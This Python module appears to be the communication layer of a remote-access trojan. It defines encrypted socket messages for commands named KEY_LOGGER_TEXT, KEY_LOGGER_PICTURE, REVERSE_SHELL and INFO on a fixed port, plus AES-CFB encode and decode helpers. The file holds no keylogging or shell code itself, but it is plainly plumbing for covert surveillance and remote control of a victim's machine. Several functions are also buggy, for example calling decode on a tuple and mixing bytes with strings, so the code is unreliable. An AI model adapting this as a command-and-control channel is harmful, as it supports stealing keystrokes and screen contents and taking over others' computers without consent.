import os.path
from Cryptodome.Cipher import AES
import os

LENGTH_FIELD_SIZE = 128
BUFFER_SIZE = 1024
PORT = 8822
OPTIONS = ["EXIT", "KEY_LOGGER_TEXT", "KEY_LOGGER_PICTURE", "REVERSE_SHELL", "KEY_LOGGER", "INFO"]


def padding(message):
    """Add padding to the message to make it a multiple of 128 characters"""
    size = LENGTH_FIELD_SIZE - AES.block_size
    if len(message) % size != 0 and len(message) < size:
        # concat the bytes / to the end of the message
        message += b"/" * (size - len(message))
    return message


def create_msg(type_msg, message, shared_key):
    """Create a valid protocol message, with length field"""
    data = []
    if type_msg == "EXIT":
        data.append(encode_message_with_padding("0", shared_key))
    if type_msg == "KEY_LOGGER_TEXT":
        data.append(encode_message_with_padding("1", shared_key))
    if type_msg == "KEY_LOGGER_PICTURE":
        data.append(encode_message_with_padding("2", shared_key))
    if type_msg == "REVERSE_SHELL":
        data.append(encode_message_with_padding("3", shared_key))
    if type_msg == "INFO":
        data.append(encode_message_with_padding("4", shared_key))

    if message and shared_key:
        encrypted_message = encode_message(message, shared_key)
        data.append(encode_message_with_padding(str(len(encrypted_message)), shared_key))
        data.append(encrypted_message)
    return data


def send_message(my_socket, type_msg, message, shared_key):
    """Send a valid protocol message, with length field"""
    data = create_msg(type_msg, message, shared_key)
    if type_msg == "EXIT":
        my_socket.sendall(data[0])
    elif len(data) == 3:
        # send all the data in the list data to the client
        my_socket.sendall(data[0])
        my_socket.sendall(data[1])
        send_message_in_parts(my_socket, data[2])


def send_message_in_parts(my_socket, message):
    # send the message in parts of BUFFER_SIZE
    for i in range(0, len(message), BUFFER_SIZE):
        my_socket.sendall(message[i:i + BUFFER_SIZE])
    

def get_type(my_socket, shared_key):
    """Extract type from protocol, without the length field
       If length field does not include a number, returns False, "Error" """
    ciphertext = my_socket.recv(LENGTH_FIELD_SIZE)
    if not ciphertext or (len(ciphertext) != LENGTH_FIELD_SIZE):
        return False, "Error:length field does not include a number"
    plaintext = decode_message_with_unpadding(ciphertext, shared_key)
    try:
        data = int(plaintext.decode())
        return True, data
    except:
        return False, "Error:length field does not include a number"


def get_msg_in_parts(my_socket, length, shared_key, picture=False):
    data = b''  # Create a byte string to store the received data
    total_data_len = length  # Total amount of data to be received
    while total_data_len > 0:  # While there is still data to be received

        if total_data_len > BUFFER_SIZE:  # If the total amount of data to be received is greater than the buffer size
            temp = my_socket.recv(BUFFER_SIZE)  # Receive the data in chunks of the buffer size
            data += temp
            total_data_len -= len(temp)  # Subtract the buffer size from the total amount of data to be received
        else:  # If the total amount of data to be received is less than the buffer size
            data += my_socket.recv(total_data_len)  # Receive the remaining data
            total_data_len = 0  # Set the total amount of data to be received to 0
    result = True, decode_message(data, shared_key)
    if picture:
        return result
    return True, result.decode('utf-8')


def get_msg(my_socket, shared_key, picture=False):
    """Extract message from protocol, without the length field
       If length field does not include a number, returns False, "Error" """
    length_msg = my_socket.recv(LENGTH_FIELD_SIZE)
    plaintext = decode_message_with_unpadding(length_msg, shared_key)
    length = plaintext.decode()

    if length.isdigit():
        length = int(length)
        if length > BUFFER_SIZE:
            return get_msg_in_parts(my_socket, length, shared_key, picture)
        # if the length is less than the buffer size
        ciphertext = my_socket.recv(length)
        return True, decode_message(ciphertext, shared_key)
    else:
        return False, "Error:length field does not include a number"


def check_iv(message):
    # check the iv, is len must be like AES.block_size
    if len(message) < AES.block_size:
        message += b'' + '/' * (AES.block_size - len(message))
        return message.split(b"/")[0]
    return message


def decode_picture(message, shared_key):
    # check if the message is empty
    if not message:
        return ""
    pic = message
    iv = check_iv(message)
    iv = pic[:AES.block_size]
    # iv = message[0][:AES.block_size]
    cipher = AES.new(shared_key, AES.MODE_CFB, iv)
    plaintext = cipher.decrypt(pic[AES.block_size:])
    # plaintext = cipher.decrypt(message[0][AES.block_size:])
    return plaintext


# this function decode the message from the client
def decode_message(message, shared_key):
    # check if the message is empty
    if not message:
        return ""
    iv = check_iv(message)
    iv = message[:AES.block_size]
    cipher = AES.new(shared_key, AES.MODE_CFB, iv)
    plaintext = cipher.decrypt(message[AES.block_size:])
    return plaintext


# this function decode the message from the client
def decode_message_with_unpadding(message, shared_key):
    # check if the message is empty
    if not message:
        return ""
    iv = message[:AES.block_size]
    cipher = AES.new(shared_key, AES.MODE_CFB, iv)
    plaintext = cipher.decrypt(message[AES.block_size:]).split(b"/")[0]
    return plaintext



# this function encrypt the message to the client
def encode_message(message, shared_key):
    iv = os.urandom(AES.block_size)
    cipher = AES.new(shared_key, AES.MODE_CFB, iv)
    # check if the message is byte type
    if isinstance(message, bytes):
        ciphertext = iv + cipher.encrypt(message)
    else:
        ciphertext = iv + cipher.encrypt(message.encode())
    return ciphertext

# this function encrypt the message to the client
def encode_message_with_padding(message, shared_key):
    iv = os.urandom(AES.block_size)
    cipher = AES.new(shared_key, AES.MODE_CFB, iv)
    ciphertext = iv + cipher.encrypt((padding(message.encode())))
    return ciphertext
